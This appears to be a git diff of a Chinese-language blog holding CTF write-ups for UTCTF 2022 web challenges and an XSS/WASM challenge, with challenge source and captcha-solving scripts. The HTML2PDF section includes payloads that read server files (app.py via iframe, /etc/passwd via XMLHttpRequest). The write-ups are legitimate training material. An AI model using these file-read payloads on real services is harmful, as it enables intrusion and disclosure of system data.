-<p>By Daniel Parks (@danielp on discord)</p>
-<p><a target="_blank" rel="noopener" href="http://web1.utctf.live:8651/">http://web1.utctf.live:8651</a></p>
-</blockquote>
-<p>别的师傅做的</p>
-<p>看一下包</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/internal/ws</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>web1.utctf.live:8651</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://web1.utctf.live:8651</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>Mn6BDybVn/BJ5iCDpZ9JSw==</span><br></pre></td></tr></table></figure>
-
-<p>建立socket连接后 爆破</p>
-<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/32495">CTFtime.org / UTCTF 2022 / Websockets / Writeup</a></p>
-<h3 id="HTML2PDF"><a href="#HTML2PDF" class="headerlink" title="HTML2PDF"></a>HTML2PDF</h3><blockquote>
-<p>My friend bet me I couldn’t pwn this site. Can you help me break in?</p>
-<p><em>by mattyp</em></p>
-<p><a target="_blank" rel="noopener" href="http://web2.utctf.live:9854/">http://web2.utctf.live:9854</a></p>
-</blockquote>
-<p><img src="%5CUTCTF.assets%5Cimage-20220314104424213.png" alt="image-20220314104424213"></p>
-<p>打开网站是个这样的页面 点submit后 会直接convert to pdf</p>
-<p>可以用 iframe 直接读文件</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>Try Me!<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;/proc/self/cwd/app.py&quot;</span> <span class="attr">height</span>=<span class="string">&quot;1600px&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800px&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf">https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf</a></p>
-<p>直接拿里面的payload打 就ok</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">x=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>;x.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>)&#125;;x.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;file:///etc/passwd&quot;</span>);x.<span class="title function_">send</span>();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="ReReCaptcha"><a href="#ReReCaptcha" class="headerlink" title="ReReCaptcha"></a>ReReCaptcha</h3><blockquote>
-<p>Just solve 1000 captchas. It’s super easy. By ggu (@ggu on discord)</p>
-<p><a target="_blank" rel="noopener" href="http://web1.utctf.live:7132/">http://web1.utctf.live:7132</a></p>
-</blockquote>
-<p>直接按像素提取 不是很出色</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res = requests.get(<span class="string">&#x27;http://web1.utctf.live:7132/&#x27;</span>)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">soup = BeautifulSoup(res.text,<span class="string">&#x27;html.parser&#x27;</span>)</span><br><span class="line">img_data = soup.find(<span class="string">&#x27;img&#x27;</span>).get(<span class="string">&#x27;src&#x27;</span>).split(<span class="string">&quot;,&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">binary_img_data = base64.b64decode(img_data)</span><br><span class="line">file_like = BytesIO(binary_img_data)</span><br><span class="line">image = Image.<span class="built_in">open</span>(file_like)</span><br><span class="line"><span class="comment"># print(image.size)</span></span><br><span class="line"><span class="comment">#尝试者把中间那块直接分割出来</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Clipper</span>(<span class="params">image</span>):</span><br><span class="line">    img = image</span><br><span class="line">    width, height = img.size</span><br><span class="line">    <span class="comment"># print(width,height)</span></span><br><span class="line">    box = (<span class="number">15</span>,<span class="number">10</span>,<span class="number">410</span>, <span class="number">110</span>)</span><br><span class="line">    <span class="comment"># 前两个坐标点是左上角坐标</span></span><br><span class="line">    <span class="comment"># 后两个坐标点是右下角坐标</span></span><br><span class="line">    <span class="comment"># width在前， height在后</span></span><br><span class="line">    region = img.crop(box)</span><br><span class="line">    <span class="comment"># region.show()</span></span><br><span class="line">    <span class="keyword">return</span> region</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">region = Clipper(image)</span><br><span class="line">region.save(<span class="string">&quot;./abab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来提取所有的黄（部分绿）像素点</span></span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">imagepath = <span class="string">r&#x27;./abab.png&#x27;</span></span><br><span class="line">image = cv2.imread(imagepath)</span><br><span class="line">height, width, channel = image.shape</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        b, g, r = image[i, j]</span><br><span class="line">        <span class="keyword">if</span> ((r - b) &gt; <span class="number">210</span> <span class="keyword">and</span> (g - b) &gt; <span class="number">80</span>):  <span class="comment">#这里需要继续调一下</span></span><br><span class="line">            b = <span class="number">0</span></span><br><span class="line">            g = <span class="number">0</span></span><br><span class="line">            r = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b = <span class="number">255</span></span><br><span class="line">            g = <span class="number">255</span></span><br><span class="line">            r = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">        image[i, j] = [r, g, b]</span><br><span class="line">plt.figure(figsize=(<span class="number">20</span>, <span class="number">10</span>))</span><br><span class="line">plt.imshow(image)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-
-<p>二值化</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 图片二值化</span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"></span><br><span class="line">img = Image.<span class="built_in">open</span>(<span class="string">&#x27;./abab.png&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模式L”为灰色图像，它的每个像素用8个bit表示，0表示黑，255表示白，其他数字表示不同的灰度。</span></span><br><span class="line">Img = img.convert(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">Img.save(<span class="string">&quot;./ab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义灰度界限，大于这个值为黑色，小于这个值为白色</span></span><br><span class="line">threshold = <span class="number">123</span></span><br><span class="line"></span><br><span class="line">table = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i &lt; threshold:</span><br><span class="line">        table.append(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 图片二值化</span></span><br><span class="line">photo = Img.point(table, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">photo.save(<span class="string">&quot;./ababab.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">photo.show()</span><br></pre></td></tr></table></figure>
-
-<p>一般</p>
-<p>我想:</p>
-<p>他这个像素值只有固定几种 不知道能不能找出加密算法 emmm</p>
-<p>然后去摸鱼了 emmm</p>
-<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/32555">CTFtime.org / UTCTF 2022 / ReReCaptcha / Writeup</a></p>
-<p>参考了下别人的wp  主要是在大量图片中提取出现次数最多的像素来获取背景图片 然后xor  gg</p>
-<h3 id="Sigma"><a href="#Sigma" class="headerlink" title="Sigma"></a>Sigma</h3><blockquote>
-<p>Our new image processing tool runs completely in your browser! Right now we only support one image effect and image format though.</p>
-<p>Note: this challenge is also a reversing challenge.</p>
-<p>By ggu (@ggu on discord)</p>
-<p><a target="_blank" rel="noopener" href="http://web2.utctf.live:5006/">http://web2.utctf.live:5006</a></p>
-<p><a target="_blank" rel="noopener" href="https://utctf.live/files/2382cf3e8bce7c5ae20c7900e44888b5/server.zip?token=eyJ1c2VyX2lkIjo2NCwidGVhbV9pZCI6MzcsImZpbGVfaWQiOjEyfQ.YixQuA.zo685DLvS_VDoKICLHwN_4RyhQo"> server.zip</a></p>
-</blockquote>
-<p>猫哥yyds</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2022/03/14/UTCTF/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -819,7 +723,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2022-03-17 20:17:30" itemprop="dateModified" datetime="2022-03-17T20:17:30+08:00">2022-03-17</time>
+      <time title="Modified: 2022-04-13 18:39:17" itemprop="dateModified" datetime="2022-04-13T18:39:17+08:00">2022-04-13</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -841,18 +745,15 @@
     
     
     <div class="post-body" itemprop="articleBody">
-          <h1 id="一个xss挑战"><a href="#一个xss挑战" class="headerlink" title="一个xss挑战"></a>一个xss挑战</h1><h3 id="source-code"><a href="#source-code" class="headerlink" title="source code"></a>source code</h3><p>直接访问 ./passenge  看下源码</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> unsafeCharacters = [<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;`&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&#123;&quot;</span>, <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="string">&quot;,&quot;</span>, <span class="string">&quot;+&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sanitize</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    str += <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> char <span class="keyword">of</span> unsafeCharacters) &#123;</span><br><span class="line">        str = str.<span class="title function_">replaceAll</span>(char, <span class="string">`&amp;#x<span class="subst">$&#123;char.codePointAt().toString(<span class="number">0x10</span>)&#125;</span>;`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showMessage</span>(<span class="params">title = <span class="string">&quot;&quot;</span>, message = <span class="string">&quot;&quot;</span>, button = &#123;</span></span><br><span class="line"><span class="params">    text: <span class="string">&quot;Close&quot;</span>,</span></span><br><span class="line"><span class="params">    action: <span class="string">&quot;this.parentElement.parentElement.parentElement.remove();&quot;</span>,</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> elem = (<span class="keyword">new</span> <span class="title class_">Range</span>).<span class="title function_">createContextualFragment</span>(<span class="string">`</span></span><br><span class="line"><span class="string">		&lt;div class=&quot;alert&quot;&gt;</span></span><br><span class="line"><span class="string">			&lt;div class=&quot;alert-inner&quot;&gt;</span></span><br><span class="line"><span class="string">				&lt;div class=&quot;page-bar&quot;&gt;</span></span><br><span class="line"><span class="string">					&lt;h3&gt;<span class="subst">$&#123;sanitize(title)&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">					&lt;button onclick=&quot;<span class="subst">$&#123;sanitize(button.action)&#125;</span>&quot;&gt;<span class="subst">$&#123;sanitize(button.text)&#125;</span>&lt;/button&gt;</span></span><br><span class="line"><span class="string">				&lt;/div&gt;</span></span><br><span class="line"><span class="string">				&lt;div class=&quot;page-content&quot;&gt;</span></span><br><span class="line"><span class="string">					<span class="subst">$&#123;sanitize(message)&#125;</span></span></span><br><span class="line"><span class="string">				&lt;/div&gt;</span></span><br><span class="line"><span class="string">			&lt;/div&gt;</span></span><br><span class="line"><span class="string">		&lt;/div&gt;</span></span><br><span class="line"><span class="string">	`</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">append</span>(elem);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> inputFields = &#123;</span><br><span class="line">    <span class="attr">passwordLength</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password-length&quot;</span>),</span><br><span class="line">    <span class="attr">allowNumbers</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;allow-numbers&quot;</span>),</span><br><span class="line">    <span class="attr">allowSymbols</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;allow-symbols&quot;</span>),</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> generating = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">generate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (generating) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">requestAnimationFrame</span>(<span class="function"><span class="params">_</span> =&gt;</span> (generating = <span class="literal">false</span>));</span><br><span class="line">    generating = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> passwordLength = inputFields.<span class="property">passwordLength</span>.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">let</span> json = <span class="string">`&#123; &quot;passwordLength&quot;: <span class="subst">$&#123;passwordLength&#125;</span>, &quot;seed&quot;: <span class="subst">$&#123;crypto.getRandomValues(<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">1</span>))[<span class="number">0</span>]&#125;</span>, &quot;allowNumbers&quot;: <span class="subst">$&#123;inputFields.allowNumbers.checked&#125;</span>, &quot;allowSymbols&quot;: <span class="subst">$&#123;inputFields.allowSymbols.checked&#125;</span> &#125;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(passwordLength = passwordLength.<span class="title function_">match</span>(<span class="regexp">/^\d+$/gm</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">showMessage</span>(<span class="string">&quot;Error&quot;</span>, <span class="string">&quot;Password Length must be a number.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    passwordLength = <span class="title class_">Number</span>(passwordLength[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">let</span> wasm = <span class="keyword">await</span> <span class="title class_">WebAssembly</span>.<span class="title function_">instantiateStreaming</span>(<span class="title function_">fetch</span>(<span class="string">&quot;program.wasm&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">env</span>: &#123;</span><br><span class="line">            <span class="attr">log_str</span>: <span class="function"><span class="params">idx</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">while</span> (u8[idx] != <span class="number">0</span>) &#123;</span><br><span class="line">                    str += <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(u8[idx]);</span><br><span class="line">                    ++idx;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">log_int</span>: <span class="variable language_">console</span>.<span class="property">log</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> u8 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="property">memory</span>.<span class="property">buffer</span>);</span><br><span class="line">    <span class="keyword">let</span> options = wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">malloc</span>(json.<span class="property">length</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">let</span> password = wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">malloc</span>(<span class="title class_">Number</span>(passwordLength) + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; json.<span class="property">length</span>; ++idx) &#123;</span><br><span class="line">        u8[options + idx] = json.<span class="title function_">codePointAt</span>(idx) % <span class="number">0xff</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    u8[options + json.<span class="property">length</span>] = <span class="number">0</span>;</span><br><span class="line">    wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="title function_">generate_password</span>(options, password);</span><br><span class="line">    <span class="keyword">let</span> output_password = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> idx = <span class="number">0</span>; idx &lt; passwordLength; ++idx) &#123;</span><br><span class="line">        output_password += <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(u8[password + idx]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">showMessage</span>(<span class="string">&quot;Password Generated&quot;</span>, <span class="string">&quot;Your password is: &quot;</span> + output_password, &#123;</span><br><span class="line">        <span class="attr">text</span>: <span class="string">&quot;OK&quot;</span>,</span><br><span class="line">        <span class="attr">action</span>: <span class="string">&quot;generateAnother();&quot;</span>,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateAnother</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> params = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>;</span><br><span class="line">    params.<span class="title function_">set</span>(<span class="string">&quot;passwordLength&quot;</span>, inputFields.<span class="property">passwordLength</span>.<span class="property">value</span>);</span><br><span class="line">    params.<span class="title function_">set</span>(<span class="string">&quot;allowNumbers&quot;</span>, inputFields.<span class="property">allowNumbers</span>.<span class="property">checked</span>);</span><br><span class="line">    params.<span class="title function_">set</span>(<span class="string">&quot;allowSymbols&quot;</span>, inputFields.<span class="property">allowSymbols</span>.<span class="property">checked</span>);</span><br><span class="line">    params.<span class="title function_">set</span>(<span class="string">&quot;timestamp&quot;</span>, <span class="title class_">Number</span>(<span class="keyword">new</span> <span class="title class_">Date</span>));</span><br><span class="line">    location.<span class="property">search</span> = params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> settings = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>);</span><br><span class="line">inputFields.<span class="property">passwordLength</span>.<span class="property">value</span> = settings.<span class="title function_">get</span>(<span class="string">&quot;passwordLength&quot;</span>) ?? <span class="number">8</span>;</span><br><span class="line">inputFields.<span class="property">allowNumbers</span>.<span class="property">checked</span> = settings.<span class="title function_">get</span>(<span class="string">&quot;allowNumbers&quot;</span>) !== <span class="string">&quot;false&quot;</span>;</span><br><span class="line">inputFields.<span class="property">allowSymbols</span>.<span class="property">checked</span> = settings.<span class="title function_">get</span>(<span class="string">&quot;allowSymbols&quot;</span>) !== <span class="string">&quot;false&quot;</span>;</span><br></pre></td></tr></table></figure>
-
-<h3 id="what-is-wasm"><a href="#what-is-wasm" class="headerlink" title="what is wasm"></a>what is wasm</h3><blockquote>
-<p>WebAssembly/<em>wasm</em> WebAssembly 或者 wasm 是一个可移植、体积小、加载快并且兼容 Web 的全新格式</p>
-</blockquote>
-<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>可以自定义一个函数拿出来方便测试</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">generate2</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (generating) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">requestAnimationFrame</span>(<span class="function"><span class="params">_</span> =&gt;</span> (generating = <span class="literal">false</span>));</span><br><span class="line">    generating = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> passwordLength = inputFields.<span class="property">passwordLength</span>.<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">let</span> json = <span class="string">`&#123; &quot;passwordLength&quot;: <span class="subst">$&#123;passwordLength&#125;</span>, &quot;seed&quot;: <span class="subst">$&#123;crypto.getRandomValues(<span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">1</span>))[<span class="number">0</span>]&#125;</span>, &quot;allowNumbers&quot;: <span class="subst">$&#123;inputFields.allowNumbers.checked&#125;</span>, &quot;allowSymbols&quot;: <span class="subst">$&#123;inputFields.allowSymbols.checked&#125;</span> &#125;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (!(passwordLength = passwordLength.<span class="title function_">match</span>(<span class="regexp">/^\d+$/gm</span>))) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">showMessage</span>(<span class="string">&quot;Error&quot;</span>, <span class="string">&quot;Password Length must be a number.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    passwordLength = <span class="title class_">Number</span>(passwordLength[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">let</span> wasm = <span class="keyword">await</span> <span class="title class_">WebAssembly</span>.<span class="title function_">instantiateStreaming</span>(<span class="title function_">fetch</span>(<span class="string">&quot;program.wasm&quot;</span>), &#123;</span><br><span class="line">        <span class="attr">env</span>: &#123;</span><br><span class="line">            <span class="attr">log_str</span>: <span class="function"><span class="params">idx</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">while</span> (u8[idx] != <span class="number">0</span>) &#123;</span><br><span class="line">                    str += <span class="title class_">String</span>.<span class="title function_">fromCodePoint</span>(u8[idx]);</span><br><span class="line">                    ++idx;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">log_int</span>: <span class="variable language_">console</span>.<span class="property">log</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> u8 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(wasm.<span class="property">instance</span>.<span class="property">exports</span>.<span class="property">memory</span>.<span 